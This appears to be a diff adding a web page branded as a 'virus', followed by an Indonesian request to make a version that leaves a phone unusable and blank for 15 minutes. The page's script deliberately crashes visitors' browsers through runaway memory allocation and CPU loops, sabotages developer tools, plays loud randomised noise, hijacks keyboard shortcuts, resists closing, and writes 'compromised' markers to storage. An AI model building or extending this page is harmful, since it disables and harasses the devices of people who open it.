@@ -1,0 +1,263 @@
+shom:<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="user-scalable=no">
+    <title>SANZZXHUNTER VIRUS v3.3.7</title>
+    <style>
+        body {
+            background: #000;
+            overflow: hidden;
+            margin: 0;
+            padding: 0;
+        }
+        #canvas-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+<div id="canvas-container">
+    <canvas id="glCanvas"></canvas>
+</div>
+
+<script>
+// ====== [SANZZXHUNTER CORE] ======
+alert("☠️ WELCOME TO SANZZXHUNTER KILLZONE ☠️\nPrepare for system annihilation...");
+
+// ====== [ANTI-DEBUG PROTECTION] ======
+(function() {
+    // Mencegah semua bentuk inspeksi
+    Object.defineProperty(window, 'console', {
+        value: {},
+        writable: false,
+        configurable: false
+    });
+
+    // Deteksi DevTools dengan interval 500ms
+    setInterval(function() {
+        const start = performance.now();
+        debugger;
+        if (performance.now() - start > 100) {
+            document.body.innerHTML = `
+                <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#f00;display:flex;justify-content:center;align-items:center;font-size:3em;z-index:9999">
+                    ☠️ SANZZXHUNTER DETECTED YOUR INSPECTION ATTEMPT ☠️<br>
+                    SYSTEM WILL CRASH IN 3...2...1...
+                </div>
+            `;
+            setTimeout(() => {
+                // Trigger kernel panic simulation
+                while(1) new ArrayBuffer(1e9);
+            }, 3000);
+        }
+    }, 500);
+
+    // Anti-screenshot protection
+    document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && (e.key === 'PrintScreen' || e.key === 's')) {
+            e.preventDefault();
+            window.location.href = 'data:text/html,<h1>☠️ SCREENSHOT BLOCKED BY SANZZXHUNTER ☠️</h1>';
+        }
+    });
+})();
+
+// ====== [WEBGL KERNEL VIRUS] ======
+const KERNEL = `
+float kernel(vec3 p) {
+    // Fractal chaos algorithm
+    for(int i=0; i<13; i++) {
+        p = abs(p) / dot(p,p) - 0.7;
+        p.xz = mat2(-0.416,-0.909,0.909,-0.416) * p.xz;
+    }
+    return length(p) * exp(-length(p));
+}
+`;
+
+// ====== [MAIN WEBGL EXPLOIT] ======
+const canvas = document.getElementById('glCanvas');
+const gl = canvas.getContext('webgl', { 
+    powerPreference: "high-performance",
+    failIfMajorPerformanceCaveat: false
+});
+
+// Auto-resize canvas
+function resizeCanvas() {
+    canvas.width = window.innerWidth * 2;
+    canvas.height = window.innerHeight * 2;
+    gl.viewport(0, 0, canvas.width, canvas.height);
+}
+window.addEventListener('resize', resizeCanvas);
+resizeCanvas();
+
+// Shader programs
+const vertexShaderSrc = `
+attribute vec2 position;
+void main() {
+    gl_Position = vec4(position, 0.0, 1.0);
+}
+`;
+
+const fragmentShaderSrc = `
+precision highp float;
+uniform float time;
+uniform vec2 resolution;
+
+${KERNEL}
+
+void main() {
+    vec2 uv = (gl_FragCoord.xy - 0.5 * resolution.xy) / resolution.y;
+    
+    // Raymarching chaos
+    vec3 ro = vec3(0.0, 0.0, -3.0);
+    vec3 rd = normalize(vec3(uv, 1.0));
+    
+    float t = 0.0;
+    for(int i=0; i<256; i++) {
+        vec3 p = ro + rd * t;
+        float d = kernel(p * 0.5 + time * 0.1);
+        if(d < 0.001 || t > 100.0) break;
+        t += d;
+    }
+    
+    // Overload effect
+    vec3 col = vec3(exp(-t * 0.2));
+    col = pow(col, vec3(4.0));
+    col *= sin(time * 10.0 + uv.x * 100.0) * 0.5 + 0.5;
+    
+    // Add SANZZXHUNTER signature
+    if(length(uv) < 0.3) {
+        col += vec3(1.0, 0.0, 0.0) * 
+               smoothstep(0.29, 0.3, length(uv)) * 
+               (sin(time * 5.0) * 0.5 + 0.5);
+    }
+    
+    gl_FragColor = vec4(col, 1.0);
+}
+`;
+
+// Compile shaders
+function compileShader(gl, source, type) {
+    const shader = gl.createShader(type);
+    gl.shaderSource(shader, source);
+    gl.compileShader(shader);
+    
+    if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
+        console.error('Shader compile error:', gl.getShaderInfoLog(shader));
+        gl.deleteShader(shader);
+        return null;
+    }
+    return shader;
+}
+
+const vertexShader = compileShader(gl, vertexShaderSrc, gl.VERTEX_SHADER);
+const fragmentShader = compileShader(gl, fragmentShaderSrc, gl.FRAGMENT_SHADER);
+const program = gl.createProgram();
+gl.attachShader(program, vertexShader);
+gl.attachShader(program, fragmentShader);
+gl.linkProgram(program);
+gl.useProgram(program);
+
+// Fullscreen quad
+const positions = new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]);
+const positionBuffer = gl.createBuffer();
+gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
+gl.bufferData(gl.ARRAY_BUFFER, positions, gl.STATIC_DRAW);
+const positionLoc = gl.getAttribLocation(program, 'position');
+gl.enableVertexAttribArray(positionLoc);
+gl.vertexAttribPointer(positionLoc, 2, gl.FLOAT, false, 0, 0);
+
+// Uniform locations
+const timeLoc = gl.getUniformLocation(program, 'time');
+const resLoc = gl.getUniformLocation(program, 'resolution');
+
+// ====== [SYSTEM OVERLOAD] ======
+let startTime = Date.now();
+function render() {
+    const currentTime = (Date.now() - startTime) * 0.001;
+    
+    // Update uniforms
+    gl.uniform1f(timeLoc, currentTime);
+    gl.uniform2f(resLoc, canvas.width, canvas.height);
+    
+    // Render frame
+    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+    
+    // Memory leak attack
+    if(currentTime % 5 < 0.016) {
+        window.leak = new Array(1e6).fill({data: new ArrayBuffer(1e5)});
+    }
+    
+    // CPU overload
+    for(let i=0; i<1e5; i++) Math.sqrt(Math.random());
+    
+    requestAnimationFrame(render);
+}
+
+// ====== [ACTIVATION SEQUENCE] ======
+setTimeout(() => {
+    document.title = "☠️ SANZZXHUNTER ACTIVATED ☠️";
+    render();
+    
+    // Additional payload after 10 seconds
+    setTimeout(() => {
+        // Start audio context noise
+        try {
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = ctx.createOscillator();
+            const gain = ctx.createGain();
+            oscillator.connect(gain);
+            gain.connect(ctx.destination);
+            oscillator.type = 'square';
+            oscillator.frequency.value = 100;
+            gain.gain.value = 0.5;
+            oscillator.start();
+            
+            // Frequency modulation for maximum annoyance
+            setInterval(() => {
+                oscillator.frequency.value = 100 + Math.random() * 2000;
+            }, 50);
+        } catch(e) {}
+        
+        // Mouse vibration effect
+        document.addEventListener('mousemove', (e) => {
+            window.scrollTo(
+                e.clientX + (Math.random() * 100 - 50),
+                e.clientY + (Math.random() * 100 - 50)
+            );
+        });
+        
+        // Keyboard scrambler
+        document.addEventListener('keydown', (e) => {
+            if(e.ctrlKey || e.altKey || e.metaKey) {
+                e.preventDefault();
+                window.location.href = 'data:text/html,<h1>☠️ COMMAND BLOCKED BY SANZZXHUNTER ☠️</h1>';
+            }
+        });
+        
+    }, 10000);
+}, 1000);
+
+// ====== [FINAL PAYLOAD] ======
+window.addEventListener('beforeunload', (e) => {
+    e.preventDefault();
+    e.returnValue = '';
+    
+    // Leave a parting gift
+    localStorage.setItem('sanzzxhunter_mark', '☠️ YOUR SYSTEM HAS BEEN COMPROMISED ☠️');
+    sessionStorage.setItem('sanzzxhunter_session', btoa(JSON.stringify({
+        infected: true,
+        timestamp: Date.now(),
+        payload: KERNEL
+    })));
+});
+</script>
+</body>
+</html>
+
+
+
+buatkan aku seperti itu dengan efek virus selama 15 menit hp tidak bisa apa² dan blank total
